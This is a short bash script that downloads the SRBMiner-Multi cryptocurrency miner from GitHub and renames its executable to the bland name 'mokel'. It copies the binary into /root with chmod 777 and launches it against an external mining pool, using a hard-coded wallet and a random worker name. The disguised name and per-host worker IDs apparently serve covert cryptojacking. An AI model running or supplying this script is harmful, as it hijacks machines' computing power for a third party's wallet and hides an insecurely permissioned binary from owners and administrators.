#!/bin/bash

# Check if wget and tar are installed
if ! command -v wget &> /dev/null || ! command -v tar &> /dev/null; then
    echo "wget and tar are required but not installed. Exiting."
    exit 1
fi

# Download SRBMiner-Multi
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
if [ $? -ne 0 ]; then
    echo "Download failed. Exiting."
    exit 1
fi

# Extract the downloaded tarball
tar -xf SRBMiner-Multi-2-4-7-Linux.tar.xz
if [ $? -ne 0 ]; then
    echo "Extraction failed. Exiting."
    exit 1
fi

# Rename the extracted directory
if [ -d "SRBMiner-Multi-2-4-7" ]; then
    mv SRBMiner-Multi-2-4-7 srb
else
    echo "Directory SRBMiner-Multi-2-4-7 does not exist. Exiting."
    exit 1
fi

# Navigate to the renamed directory
cd srb || { echo "Failed to change directory to srb. Exiting."; exit 1; }

# Rename the SRBMiner-MULTI executable
if [ -f "SRBMiner-MULTI" ]; then
    mv SRBMiner-MULTI mokel
else
    echo "Executable SRBMiner-MULTI does not exist. Exiting."
    exit 1
fi

# Copy the renamed executable to the /root directory
if [ -f "mokel" ]; then
    cp -r mokel /root
else
    echo "Executable mokel does not exist. Exiting."
    exit 1
fi

# Change permissions of the executable
chmod 777 /root/mokel
if [ $? -ne 0 ]; then
    echo "Failed to change permissions for /root/mokel. Exiting."
    exit 1
fi

# Generate a random name
random_name=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)

# Execute the miner with specified parameters
/root/mokel --algorithm aurum --pool stratum-eu.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.$random_name
if [ $? -ne 0 ]; then
    echo "Failed to execute mokel. Exiting."
    exit 1
fi
